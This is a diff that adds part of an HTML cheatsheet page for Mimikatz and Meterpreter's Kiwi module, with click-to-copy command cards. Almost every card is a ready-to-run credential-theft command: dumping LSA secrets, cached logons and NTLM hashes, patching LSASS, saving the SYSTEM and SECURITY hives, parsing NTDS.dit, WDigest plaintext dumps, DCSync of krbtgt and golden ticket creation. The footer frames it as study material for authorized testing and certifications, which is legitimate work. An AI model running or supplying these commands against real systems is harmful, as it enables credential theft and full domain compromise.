+        <p class="cmd-desc">Dump LSA secrets (service accounts, DPAPI, cached creds)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">lsadump</span>::<span class="op">secrets</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Dump LSA + patch LSASS to retrieve secrets</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">lsadump</span>::<span class="op">lsa</span> <span class="flag">/patch</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Dump cached domain credentials (cached logons)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">lsadump</span>::<span class="op">cache</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" data-search="lsadump ntds dit offline vshadow volume shadow">
+      <div class="card-header">
+        <span class="card-title">NTDS.dit Offline Dump</span>
+        <span class="card-tag tag-cred">NTDS</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Parse NTDS.dit + SYSTEM hive (offline)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">lsadump</span>::<span class="op">lsa</span> <span class="flag">/system:</span><span class="str">SYSTEM</span> <span class="flag">/ntds:</span><span class="str">ntds.dit</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Save registry hives (run as admin on DC)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          reg save HKLM\SYSTEM <span class="str">C:\SYSTEM.hiv</span><br>
+          reg save HKLM\SECURITY <span class="str">C:\SECURITY.hiv</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- METERPRETER/KIWI -->
+<div class="section visible" data-tab="meterp">
+  <div class="section-title">🐚 Meterpreter / Kiwi Module</div>
+  <div class="cards">
+
+    <div class="card" data-search="meterpreter kiwi load extension module">
+      <div class="card-header">
+        <span class="card-title">Load Kiwi in Meterpreter</span>
+        <span class="card-tag tag-util">Kiwi</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Load the kiwi (mimikatz) extension in Meterpreter — use 64-bit process</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">load kiwi</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Migrate to 64-bit process first (lsass.exe preferred)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">migrate</span> <span class="str">-N lsass.exe</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Show all kiwi commands</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">help kiwi</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="card" data-search="kiwi creds all lsa dump sam hash meterpreter">
+      <div class="card-header">
+        <span class="card-title">Kiwi Credential Commands</span>
+        <span class="card-tag tag-cred">Kiwi</span>
+      </div>
+      <div class="card-body">
+        <p class="cmd-desc">Dump all credentials</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">creds_all</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Dump NTLM hashes from SAM</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">creds_msv</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Dump WDigest (plaintext)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">creds_wdigest</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Dump Kerberos credentials</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">creds_kerberos</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">LSA dump (SAM + secrets)</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">lsa_dump_sam</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">lsa_dump_secrets</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">DCSync from meterpreter kiwi</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">dcsync_ntlm krbtgt</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+        <p class="cmd-desc">Golden ticket from kiwi</p>
+        <div class="cmd-block" onclick="copyCmd(this)">
+          <span class="kw">golden_ticket_create</span> <span class="flag">-d</span> <span class="str">domain.local</span> <span class="flag">-u</span> <span class="str">Administrator</span> <span class="flag">-s</span> <span class="str">SID</span> <span class="flag">-k</span> <span class="str">KRBTGT_HASH</span> <span class="flag">-t</span> <span class="str">/tmp/gold.kirbi</span>
+          <span class="copy-hint">📋 click to copy</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<div class="kiwi-divider">🥝 ✦ 🥝 ✦ 🥝</div>
+
+<footer>
+  <p>🥝 Mimikatz / Kiwi Cheatsheet — For authorized security testing & CRTP/OSCP study only</p>
+  <p style="margin-top:6px;">Click any command to copy · Built for red team ops</p>
+</footer>
+
+</div><!-- /wrapper -->
+
+<script>
+function showTab(tab, btn) {
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+
+  const sections = document.querySelectorAll('.section');
+  if (tab === 'all') {
+    sections.forEach(s => s.classList.add('visible'));
+  } else {
+    sections.forEach(s => {
+      s.classList.toggle('visible', s.dataset.tab === tab);
+    });
+  }
+}
+
+function filterCards() {
+  const q = document.getElementById('searchBox').value.toLowerCase();
+  const cards = document.querySelectorAll('.card');
+  const sections = document.querySelectorAll('.section');
+
+  if (!q) {
+    const activeTab = document.querySelector('.tab-btn.active');
+    const tab = activeTab ? activeTab.textContent.trim().split(' ').pop().toLowerCase() : 'all';
+    cards.forEach(c => c.style.display = '');
+    sections.forEach(s => {
+      if (tab === 'all') s.classList.add('visible');
+    });
+    return;
+  }
+
+  sections.forEach(s => s.classList.add('visible'));
+  cards.forEach(card => {
+    const text = (card.dataset.search || '') + card.textContent.toLowerCase();
+    card.style.display = text.includes(q) ? '' : 'none';
+  });
+}
+
+function copyCmd(el) {
+  const text = el.innerText.replace('📋 click to copy', '').replace('📋', '').trim();
+  navigator.clipboard.writeText(text).catch(() => {});
+  const hint = el.querySelector('.copy-hint');
+  if (hint) {
+    hint.textContent = '✅ copied!';
+    hint.classList.add('copied');
+    hint.style.opacity = '1';
+    setTimeout(() => {
+      hint.textContent = '📋 click to copy';
+      hint.classList.remove('copied');
+      hint.style.opacity = '';
+    }, 1500);
+  }
+}
+</script>
+</body>
+</html>
